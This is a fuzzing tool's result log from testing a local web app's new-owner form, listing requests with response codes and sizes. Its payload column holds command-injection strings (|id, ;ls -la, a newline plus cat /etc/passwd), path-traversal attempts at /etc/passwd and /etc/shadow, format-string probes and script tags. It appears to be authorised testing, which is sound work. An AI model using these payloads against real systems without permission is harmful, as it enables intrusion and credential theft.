Target: http://localhost:8080/owners/new?firstName=FUZZ&lastName=FUZZ&address=FUZZ&city=FUZZ&telephone=FUZZ
Total requests: 468
==================================================================
ID    Response   Lines      Word         Chars          Request    
==================================================================
00028:  C=400     11 L	     136 W	   2206 Ch	  "\0\0\0 - \0\0\0 - \0\0\0 - \0\0\0 - \0\0\0"
00023:  C=200    174 L	     307 W	   5129 Ch	  "%0a - %0a - %0a - %0a - %0a"
00025:  C=200    174 L	     307 W	   5129 Ch	  "+%00 - +%00 - +%00 - +%00 - +%00"
00027:  C=400     11 L	     136 W	   2186 Ch	  "\0\0 - \0\0 - \0\0 - \0\0 - \0\0"
00026:  C=400     11 L	     136 W	   2166 Ch	  "\0 - \0 - \0 - \0 - \0"
00024:  C=200    174 L	     307 W	   5129 Ch	  "%00 - %00 - %00 - %00 - %00"
00001:  C=200    174 L	     307 W	   5129 Ch	  "A - A - A - A - A"
00003:  C=200    174 L	     307 W	   5129 Ch	  "FALSE - FALSE - FALSE - FALSE - FALSE"
00007:  C=200    174 L	     307 W	   5129 Ch	  "-1 - -1 - -1 - -1 - -1"
00015:  C=200    174 L	     307 W	   5129 Ch	  "-268435455 - -268435455 - -268435455 - -268435455 - -268435455"
00022:  C=400     11 L	     136 W	   2656 Ch	  "<  script > < / script> - <  script > < / script> - <  script > < / script> - <  script > < / script> - <  script > < / script>"
00021:  C=400     11 L	     136 W	   2176 Ch	  "\00 - \00 - \00 - \00 - \00"
00020:  C=400     11 L	     136 W	   2166 Ch	  "\0 - \0 - \0 - \0 - \0"
00019:  C=200    174 L	     307 W	   5129 Ch	  "null - null - null - null - null"
00018:  C=200    174 L	     307 W	   5129 Ch	  "NULL - NULL - NULL - NULL - NULL"
00017:  C=200    174 L	     307 W	   5129 Ch	  "0xfffffff - 0xfffffff - 0xfffffff - 0xfffffff - 0xfffffff"
00016:  C=200    174 L	     307 W	   5129 Ch	  "2147483647 - 2147483647 - 2147483647 - 2147483647 - 2147483647"
00013:  C=200    174 L	     307 W	   5129 Ch	  "65536 - 65536 - 65536 - 65536 - 65536"
00012:  C=200    174 L	     307 W	   5129 Ch	  "-20 - -20 - -20 - -20 - -20"
00014:  C=200    174 L	     307 W	   5129 Ch	  "268435455 - 268435455 - 268435455 - 268435455 - 268435455"
00009:  C=200    174 L	     307 W	   5129 Ch	  "-1.0 - -1.0 - -1.0 - -1.0 - -1.0"
00010:  C=200    174 L	     307 W	   5129 Ch	  "2 - 2 - 2 - 2 - 2"
00006:  C=200    174 L	     307 W	   5129 Ch	  "1 - 1 - 1 - 1 - 1"
00008:  C=200    174 L	     307 W	   5129 Ch	  "1.0 - 1.0 - 1.0 - 1.0 - 1.0"
00029:  C=400     11 L	     136 W	   2176 Ch	  "\00 - \00 - \00 - \00 - \00"
00031:  C=400     11 L	     136 W	   2236 Ch	  "\00\00\00 - \00\00\00 - \00\00\00 - \00\00\00 - \00\00\00"
00011:  C=200    174 L	     307 W	   5129 Ch	  "-2 - -2 - -2 - -2 - -2"
00005:  C=200    174 L	     307 W	   5129 Ch	  "00 - 00 - 00 - 00 - 00"
00035:  C=400     11 L	     136 W	   2196 Ch	  "`dir` - `dir` - `dir` - `dir` - `dir`"
00049:  C=400     11 L	     136 W	   2236 Ch	  "|ls -la - |ls -la - |ls -la - |ls -la - |ls -la"
00048:  C=400     11 L	     136 W	   2176 Ch	  "|ls - |ls - |ls - |ls - |ls"
00002:  C=200    174 L	     307 W	   5129 Ch	  "TRUE - TRUE - TRUE - TRUE - TRUE"
00047:  C=400     11 L	     136 W	   2196 Ch	  "|dir| - |dir| - |dir| - |dir| - |dir|"
00046:  C=400     11 L	     136 W	   2186 Ch	  "|dir - |dir - |dir - |dir - |dir"
00045:  C=400     11 L	     136 W	   2176 Ch	  "|id - |id - |id - |id - |id"
00004:  C=200    174 L	     307 W	   5129 Ch	  "0 - 0 - 0 - 0 - 0"
00044:  C=400     11 L	     136 W	   2206 Ch	  "id%00| - id%00| - id%00| - id%00| - id%00|"
00041:  C=400     11 L	     136 W	   2186 Ch	  "|id| - |id| - |id| - |id| - |id|"
00040:  C=400     11 L	     136 W	   2256 Ch	  "\"blah - \"blah - \"blah - \"blah - \"blah"
00039:  C=400     11 L	     136 W	   2316 Ch	  "\nnetstat -a%\n - \nnetstat -a%\n - \nnetstat -a%\n - \nnetstat -a%\n - \nnetstat -a%\n"
00043:  C=200    174 L	     307 W	   5129 Ch	  "id%00 - id%00 - id%00 - id%00 - id%00"
00051:  C=200    174 L	     307 W	   5129 Ch	  ";dir - ;dir - ;dir - ;dir - ;dir"
00050:  C=200    174 L	     307 W	   5129 Ch	  ";ls -la - ;ls -la - ;ls -la - ;ls -la - ;ls -la"
00034:  C=400     11 L	     136 W	   2186 Ch	  "`id` - `id` - `id` - `id` - `id`"
00030:  C=400     11 L	     136 W	   2206 Ch	  "\00\00 - \00\00 - \00\00 - \00\00 - \00\00"
00052:  C=400     11 L	     136 W	   2366 Ch	  "|/bin/ls -al - |/bin/ls -al - |/bin/ls -al - |/bin/ls -al - |/bin/ls -al"
00042:  C=200    174 L	     307 W	   5129 Ch	  "&quot;;id&quot; - &quot;;id&quot; - &quot;;id&quot; - &quot;;id&quot; - &quot;;id&quot;"
00058:  C=400     11 L	     136 W	   2336 Ch	  "/index.html|id| - /index.html|id| - /index.html|id| - /index.html|id| - /index.html|id|"
00038:  C=200    174 L	     307 W	   5129 Ch	  ";netstat -a; - ;netstat -a; - ;netstat -a; - ;netstat -a; - ;netstat -a;"
00057:  C=400     11 L	     136 W	   2216 Ch	  "?x=> - ?x=> - ?x=> - ?x=> - ?x=>"
00037:  C=200    174 L	     307 W	   5129 Ch	  ";read; - ;read; - ;read; - ;read; - ;read;"
00056:  C=400     11 L	     136 W	   2186 Ch	  "?x=| - ?x=| - ?x=| - ?x=| - ?x=|"
00053:  C=400     11 L	     136 W	   2396 Ch	  "\n/bin/ls -al\n - \n/bin/ls -al\n - \n/bin/ls -al\n - \n/bin/ls -al\n - \n/bin/ls -al\n"
00036:  C=200    174 L	     307 W	   5129 Ch	  ";id; - ;id; - ;id; - ;id; - ;id;"
00033:  C=200    174 L	     307 W	   5129 Ch	  "$NULL - $NULL - $NULL - $NULL - $NULL"
00055:  C=400     11 L	     136 W	   2236 Ch	  "?x=" - ?x=" - ?x=" - ?x=" - ?x=""
00062:  C=400     11 L	     136 W	   2796 Ch	  "ABCD|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x| - ABCD|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x| - ABCD|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x| - ABCD|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x| - ABCD|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|"
00032:  C=200    174 L	     307 W	   5129 Ch	  "$null - $null - $null - $null - $null"
00054:  C=200    174 L	     307 W	   5129 Ch	  "?x= - ?x= - ?x= - ?x= - ?x="
00061:  C=200    174 L	     307 W	   5129 Ch	  "/etc/shadow - /etc/shadow - /etc/shadow - /etc/shadow - /etc/shadow"
00060:  C=200    174 L	     307 W	   5129 Ch	  "/etc/passwd - /etc/passwd - /etc/passwd - /etc/passwd - /etc/passwd"
00072:  C=400     11 L	     136 W	   3056 Ch	  "/../../../../../../../../../../etc/shadow^^ - /../../../../../../../../../../etc/shadow^^ - /../../../../../../../../../../etc/shadow^^ - /../../../../../../../../../../etc/shadow^^ - /../../../../../../../../../../etc/shadow^^"
00059:  C=200    174 L	     307 W	   5129 Ch	  "/boot.ini - /boot.ini - /boot.ini - /boot.ini - /boot.ini"
00071:  C=400     11 L	     136 W	   3056 Ch	  "/../../../../../../../../../../etc/passwd^^ - /../../../../../../../../../../etc/passwd^^ - /../../../../../../../../../../etc/passwd^^ - /../../../../../../../../../../etc/passwd^^ - /../../../../../../../../../../etc/passwd^^"
00064:  C=200    174 L	     307 W	   5129 Ch	  "../../../../../../../../../../../../etc/hosts - ../../../../../../../../../../../../etc/hosts - ../../../../../../../../../../../../etc/hosts - ../../../../../../../../../../../../etc/hosts - ../../../../../../../../../../../../etc/hosts"
00068:  C=200    174 L	     307 W	   5129 Ch	  "../../../../../../../../../../../../etc/passwd - ../../../../../../../../../../../../etc/passwd - ../../../../../../../../../../../../etc/passwd - ../../../../../../../../../../../../etc/passwd - ../../../../../../../../../../../../etc/passwd"
00075:  C=200    174 L	     307 W	   5129 Ch	  "/./././././././././././etc/passwd - /./././././././././././etc/passwd - /./././././././././././etc/passwd - /./././././././././././etc/passwd - /./././././././././././etc/passwd"
00073:  C=200    174 L	     307 W	   5129 Ch	  "/../../../../../../../../../../etc/passwd - /../../../../../../../../../../etc/passwd - /../../../../../../../../../../etc/passwd - /../../../../../../../../../../etc/passwd - /../../../../../../../../../../etc/passwd"
00082:  C=400     11 L	     136 W	   2936 Ch	  "/..\../..\../..\../..\../..\../..\../etc/shadow - /..\../..\../..\../..\../..\../..\../etc/shadow - /..\../..\../..\../..\../..\../..\../etc/shadow - /..\../..\../..\../..\../..\../..\../etc/shadow - /..\../..\../..\../..\../..\../..\../etc/shadow"
00070:  C=200    174 L	     307 W	   5129 Ch	  "../../../../../../../../../../../../etc/shadow - ../../../../../../../../../../../../etc/shadow - ../../../../../../../../../../../../etc/shadow - ../../../../../../../../../../../../etc/shadow - ../../../../../../../../../../../../etc/shadow"
00074:  C=200    174 L	     307 W	   5129 Ch	  "/../../../../../../../../../../etc/shadow - /../../../../../../../../../../etc/shadow - /../../../../../../../../../../etc/shadow - /../../../../../../../../../../etc/shadow - /../../../../../../../../../../etc/shadow"
00078:  C=400     11 L	     136 W	   2556 Ch	  "\..\..\..\..\..\..\..\..\..\..\etc\shadow - \..\..\..\..\..\..\..\..\..\..\etc\shadow - \..\..\..\..\..\..\..\..\..\..\etc\shadow - \..\..\..\..\..\..\..\..\..\..\etc\shadow - \..\..\..\..\..\..\..\..\..\..\etc\shadow"
00067:  C=200    174 L	     307 W	   5129 Ch	  "../../../../../../../../../../../../etc/passwd%00 - ../../../../../../../../../../../../etc/passwd%00 - ../../../../../../../../../../../../etc/passwd%00 - ../../../../../../../../../../../../etc/passwd%00 - ../../../../../../../../../../../../etc/passwd%00"
00088:  C=400     11 L	     136 W	   2576 Ch	  "..\..\..\..\..\..\..\..\..\..\etc\shadow%00 - ..\..\..\..\..\..\..\..\..\..\etc\shadow%00 - ..\..\..\..\..\..\..\..\..\..\etc\shadow%00 - ..\..\..\..\..\..\..\..\..\..\etc\shadow%00 - ..\..\..\..\..\..\..\..\..\..\etc\shadow%00"
00087:  C=400     11 L	     136 W	   2576 Ch	  "..\..\..\..\..\..\..\..\..\..\etc\passwd%00 - ..\..\..\..\..\..\..\..\..\..\etc\passwd%00 - ..\..\..\..\..\..\..\..\..\..\etc\passwd%00 - ..\..\..\..\..\..\..\..\..\..\etc\passwd%00 - ..\..\..\..\..\..\..\..\..\..\etc\passwd%00"
00063:  C=200    174 L	     307 W	   5129 Ch	  "../../../../../../../../../../../../etc/hosts%00 - ../../../../../../../../../../../../etc/hosts%00 - ../../../../../../../../../../../../etc/hosts%00 - ../../../../../../../../../../../../etc/hosts%00 - ../../../../../../../../../../../../etc/hosts%00"
00069:  C=200    174 L	     307 W	   5129 Ch	  "../../../../../../../../../../../../etc/shadow%00 - ../../../../../../../../../../../../etc/shadow%00 - ../../../../../../../../../../../../etc/shadow%00 - ../../../../../../../../../../../../etc/shadow%00 - ../../../../../../../../../../../../etc/shadow%00"
00066:  C=200    174 L	     307 W	   5129 Ch	  "/../../../../../../../../%2A - /../../../../../../../../%2A - /../../../../../../../../%2A - /../../../../../../../../%2A - /../../../../../../../../%2A"
00086:  C=400     11 L	     136 W	   2586 Ch	  "\..\..\..\..\..\..\..\..\..\..\etc\shadow%00 - \..\..\..\..\..\..\..\..\..\..\etc\shadow%00 - \..\..\..\..\..\..\..\..\..\..\etc\shadow%00 - \..\..\..\..\..\..\..\..\..\..\etc\shadow%00 - \..\..\..\..\..\..\..\..\..\..\etc\shadow%00"
00085:  C=400     11 L	     136 W	   2586 Ch	  "\..\..\..\..\..\..\..\..\..\..\etc\passwd%00 - \..\..\..\..\..\..\..\..\..\..\etc\passwd%00 - \..\..\..\..\..\..\..\..\..\..\etc\passwd%00 - \..\..\..\..\..\..\..\..\..\..\etc\passwd%00 - \..\..\..\..\..\..\..\..\..\..\etc\passwd%00"
00065:  C=200    174 L	     307 W	   5129 Ch	  "../../boot.ini - ../../boot.ini - ../../boot.ini - ../../boot.ini - ../../boot.ini"
00076:  C=200    174 L	     307 W	   5129 Ch	  "/./././././././././././etc/shadow - /./././././././././././etc/shadow - /./././././././././././etc/shadow - /./././././././././././etc/shadow - /./././././././././././etc/shadow"
00089:  C=200    174 L	     307 W	   5129 Ch	  "%0a/bin/cat%20/etc/passwd - %0a/bin/cat%20/etc/passwd - %0a/bin/cat%20/etc/passwd - %0a/bin/cat%20/etc/passwd - %0a/bin/cat%20/etc/passwd"
